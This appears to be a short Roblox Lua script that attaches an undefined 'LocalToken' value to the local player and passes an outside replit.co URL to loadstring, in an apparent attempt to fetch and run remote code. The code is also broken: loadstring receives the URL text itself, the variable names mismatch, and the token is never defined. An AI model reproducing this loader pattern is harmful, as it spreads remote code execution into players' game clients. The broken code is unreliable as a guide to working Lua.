repeat wait() until game.Players.LocalPlayer --Wait until player loaded

--Locals
local sa_Instance
local player
local ip

--Assign

player = game.Players.LocalPlayer

ip = "https://mrbombastic.starvdog.repl.co"

sa_instance = Instance.new("StringValue")
sa_instance.Parent = player
sa_instance.Value = LocalToken

--Connect

loadstring(ip)
